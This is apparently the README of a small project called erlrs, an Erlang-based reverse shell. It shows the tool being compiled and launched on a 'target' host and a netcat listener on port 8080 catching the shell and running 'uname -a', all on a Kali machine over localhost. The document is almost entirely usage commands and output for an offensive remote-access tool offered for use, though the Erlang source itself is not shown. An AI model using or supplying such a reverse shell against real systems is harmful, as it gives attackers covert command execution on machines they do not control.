# erlrs

erlang based reverse shell

**Usage**

Target
```
root@WOPR-KALI:/opt/erlrs# erlc erlrs.erl 
erlrs.erl:13: Warning: variable 'Reason' is unused
erlrs.erl:24: Warning: variable 'Reason' is unused
root@WOPR-KALI:/opt/erlrs# erl -noshell -s erlrs main


```

Listener
```
root@WOPR-KALI:~# nc -lvnp 8080
listening on [any] 8080 ...
connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 44983
uname -a
Linux WOPR-KALI 5.3.0-kali2-amd64 #1 SMP Debian 5.3.9-1kali1 (2019-11-11) x86_64 GNU/Linux
^C
```
